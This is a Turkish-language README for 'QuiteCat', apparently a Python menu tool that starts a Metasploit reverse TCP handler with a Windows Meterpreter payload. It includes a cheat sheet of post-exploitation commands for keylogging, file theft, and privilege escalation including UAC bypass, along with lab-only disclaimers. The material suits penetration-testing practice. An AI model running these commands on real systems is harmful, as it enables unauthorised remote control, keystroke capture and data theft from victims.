# QuiteCat


Metasploit Framework (MSFConsole) üzerinde **reverse TCP dinleyici (handler)** yönetimini kolaylaştırmak amacıyla geliştirilmiş, **menü tabanlı**, **otomasyon odaklı** bir yardımcı araçtır.

Araç; LHOST / LPORT yönetimi, dinleyici başlatma ve post-exploitation aşamalarında sık kullanılan **cheat komutlarını** tek merkezde toplayarak süreci hızlandırır.

<img width="1908" height="983" alt="Ekran görüntüsü 2026-01-07 171922" src="https://github.com/user-attachments/assets/e6d20b66-d03c-4933-a1b4-b640b89aa5d9" />

---

## Genel Özellikler

• Menü tabanlı kullanım  
• LHOST ve LPORT doğrulamalı ayar yönetimi  
• Metasploit `multi/handler` otomatik başlatma  
• IP adresi ve port doğrulama  
• Eğitim amaçlı MSF cheat-sheet entegrasyonu  
• ASCII banner ve yükleme animasyonu  

---

## Gereksinimler

• Python 3.x  
• Metasploit Framework  
• Linux tabanlı işletim sistemi  
• Terminal erişimi  

---

## Kurulum

Projeyi yerel sisteminize klonlayın:

```bash
git clone https://github.com/osmnabyram/QuiteCat.py.git
cd QuiteCat.py
chmod +x QuiteCat.py
```

## Menü Seçenekleri

• **[1] Cheat Kodları**  
  MSFConsole üzerinde sık kullanılan komutlar ve senaryo bazlı örnekler

• **[2] Ayarları Güncelle (IP / Port)**  
  LHOST ve LPORT değerlerini doğrulamalı şekilde güncelleme

• **[3] Dinleyici Başlat**  
  Metasploit `exploit/multi/handler` ile reverse TCP listener başlatma

• **[0] Çıkış**  
  Programdan güvenli çıkış

---

## Çalışma Akışı

• Sistem yükleme animasyonu gösterilir  
• ASCII banner basılır  
• Güncel LHOST ve LPORT ekrana yazdırılır  
• Kullanıcı menüden seçim yapar  
• Seçilen işleme göre ilgili fonksiyon çalıştırılır  

---

## Dinleyici Başlatma Süreci

• `msfconsole` sessiz modda (`-q`) başlatılır  
• `exploit/multi/handler` kullanılır  
• Payload: `windows/meterpreter/reverse_tcp`  
• LHOST ve LPORT otomatik set edilir  
• Dinleyici arka planda (`-j`) çalıştırılır  

---

## Dahili Cheat Kodları (Özet)

### Temel

• `use exploit/multi/handler`  
• `set PAYLOAD windows/meterpreter/reverse_tcp`  
• `exploit -j`  

### Sistem Bilgisi

• `sysinfo`  
• `getuid`  
• `ifconfig`  

### Keylogger

• `keyscan_start`  
• `keyscan_dump`  
• `keyscan_stop`  

### Dosya Sistemi

• `download C:\\file.txt`  
• `upload /path/file`  
• `search -f *.pdf`  

### Privilege Escalation

• `getsystem`  
• `run post/multi/recon/local_exploit_suggester`  
• `use exploit/windows/local/bypassuac`  

---

## Hata Kontrolleri

• Geçersiz IP adresi girilirse kabul edilmez  
• Port 1–65535 aralığında değilse reddedilir  
• MSFConsole başlatılamazsa kullanıcı bilgilendirilir  

---

## Güvenlik Notları

• Araç yalnızca eğitim ve laboratuvar amaçlıdır  
• Gerçek sistemlerde izinsiz kullanım yapılmamalıdır  
• Kullanıcı kendi eylemlerinden sorumludur  

---

## Yasal Uyarı

Bu yazılım yalnızca **eğitim**, **CTF** ve **açık izin verilmiş sızma testleri**
için geliştirilmiştir.

Yetkisiz sistemlere karşı kullanımı **yasadışıdır** ve **hukuki sonuçlar**
doğurur.

Geliştirici (**osmnabyram**), bu aracın kötüye kullanımından kaynaklanan
hiçbir **hukuki** veya **teknik** zarardan sorumlu değildir.
